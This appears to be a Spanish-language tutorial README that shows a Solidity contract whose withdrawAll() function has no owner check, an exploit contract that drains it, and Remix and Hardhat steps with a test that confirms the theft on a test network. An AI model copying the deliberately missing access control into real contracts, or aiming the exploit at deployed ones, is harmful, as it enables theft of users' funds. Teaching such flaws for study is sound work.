# sc-vu
1. Contrato Vulnerable
El siguiente contrato tiene una función withdrawAll() marcada como public, lo cual permite que cualquier persona (no solo el dueño) pueda retirar todos los fondos del contrato.

solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract VulnerableContract {
    uint256 public balance;
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    // Modificador que permite solo al dueño del contrato realizar ciertas acciones
    modifier onlyOwner() {
        require(msg.sender == owner, "No eres el propietario del contrato");
        _;
    }

    // Función pública para depositar Ether en el contrato
    function deposit() public payable {
        balance += msg.value;
    }

    // Función vulnerable: cualquier persona puede retirar todo el balance
    function withdrawAll() public {
        require(balance > 0, "Saldo insuficiente");
        payable(msg.sender).transfer(balance);
        balance = 0;
    }

    // Función de retiro de emergencia solo para el dueño del contrato
    function emergencyWithdraw() external onlyOwner {
        payable(owner).transfer(balance);
        balance = 0;
    }
}
Explicación de la Vulnerabilidad
La función withdrawAll() está marcada como public, lo que significa que cualquiera puede llamarla y vaciar el balance del contrato.
Esta función debería haber sido restringida con un modificador como onlyOwner para que solo el dueño pudiera realizar retiros.
2. Contrato de Explotación
Este contrato interactúa con el contrato vulnerable para explotar la función withdrawAll() y robar todos los fondos.

solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerableContract.sol";

contract ExploitContract {
    VulnerableContract public vulnerable;

    constructor(address _vulnerableAddress) {
        vulnerable = VulnerableContract(_vulnerableAddress);
    }

    // Función que explota la vulnerabilidad llamando a withdrawAll
    function exploit() public {
        vulnerable.withdrawAll();
    }

    // Función para recibir los fondos explotados
    receive() external payable {}
}
3. ¿Cómo funciona la explotación?
El contrato ExploitContract interactúa con el contrato vulnerable llamando a la función withdrawAll().
Debido a que withdrawAll() es pública, el contrato atacante puede retirar todos los fondos sin restricciones.
4. Instrucciones para Probar y Verificar la Vulnerabilidad
Opción 1: Usar Remix
Abre Remix IDE.
Crea dos archivos: VulnerableContract.sol y ExploitContract.sol con los códigos anteriores.
Despliega el contrato vulnerable:
Despliega VulnerableContract en la red de pruebas de tu preferencia (Ropsten, Kovan, o una red local como Ganache).
Usa la función deposit() para enviar Ether al contrato.
Despliega el contrato de explotación:
Despliega ExploitContract, pasando como parámetro la dirección del contrato vulnerable.
Realiza la explotación:
Llama a la función exploit() en ExploitContract.
Todos los fondos serán transferidos del contrato vulnerable al contrato atacante.
Opción 2: Usar Hardhat
Si prefieres un entorno de desarrollo más avanzado como Hardhat, puedes seguir estos pasos:

Instalar Hardhat: Asegúrate de tener Hardhat instalado en tu entorno:

bash
npm install --save-dev hardhat
Crear el proyecto y añadir contratos: Crea un nuevo proyecto de Hardhat y copia los contratos VulnerableContract.sol y ExploitContract.sol dentro de la carpeta contracts/.

Escribir un test en JavaScript para probar la vulnerabilidad: Crea un archivo en la carpeta test/ y escribe un script como el siguiente:

const { expect } = require("chai");

describe("Vulnerability Test", function () {
  it("Should exploit the vulnerability", async function () {
    const [owner, attacker] = await ethers.getSigners();

    // Desplegar el contrato vulnerable
    const VulnerableContract = await ethers.getContractFactory("VulnerableContract");
    const vulnerable = await VulnerableContract.deploy();
    await vulnerable.deployed();

    // Depositar algo de Ether en el contrato vulnerable
    await vulnerable.connect(owner).deposit({ value: ethers.utils.parseEther("1") });

    // Desplegar el contrato explotador
    const ExploitContract = await ethers.getContractFactory("ExploitContract");
    const exploit = await ExploitContract.connect(attacker).deploy(vulnerable.address);
    await exploit.deployed();

    // Realizar la explotación
    await exploit.connect(attacker).exploit();

    // Verificar que el balance del contrato vulnerable es 0
    const balance = await ethers.provider.getBalance(vulnerable.address);
    expect(balance).to.equal(0);
  });
});
Ejecutar las pruebas: Ejecuta el siguiente comando para correr las pruebas:

bash
npx hardhat test
